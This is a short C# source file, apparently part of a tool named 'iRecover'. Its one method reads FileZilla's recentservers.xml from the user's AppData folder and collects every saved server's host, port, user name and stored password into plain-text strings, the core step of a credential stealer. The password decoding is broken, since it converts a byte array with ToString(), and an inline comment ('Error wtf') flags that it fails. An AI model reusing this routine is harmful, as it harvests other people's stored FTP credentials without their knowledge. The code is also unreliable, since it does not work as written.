using System;
using System.Collections.Generic;
using System.Data;
using System.IO;

namespace iRecover
{
    public static class Tools
    {
        public static List<string> FileZilla()
        {
            List<string> hosts = new List<string>();
            string DocumentoXml = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\Filezilla\\recentservers.xml";
            int counter = File.ReadAllText(DocumentoXml).Split(new string[] { "<Server>" }, StringSplitOptions.None).Length - 1;
            string StrHost;
            string StrPort;
            string StrUser;
            string StrPass;
            DataSet Ds = new DataSet();
            Ds.ReadXml(DocumentoXml);
            for (int i = 0; i < counter; i++)
            {
                StrHost = Ds.Tables["Server"].Rows[i]["Host"].ToString();
                StrPort = Ds.Tables["Server"].Rows[i]["Port"].ToString();
                StrUser = Ds.Tables["Server"].Rows[i]["User"].ToString();
                StrPass = Convert.FromBase64String(Ds.Tables["Server"].Rows[i]["Pass"].ToString()).ToString(); //Error wtf
                hosts.Add("Host: " + StrHost + " Port: " + StrPort + " User: " + StrUser + " Password: " + StrPass);
            }
            return hosts;
        }
    }
}
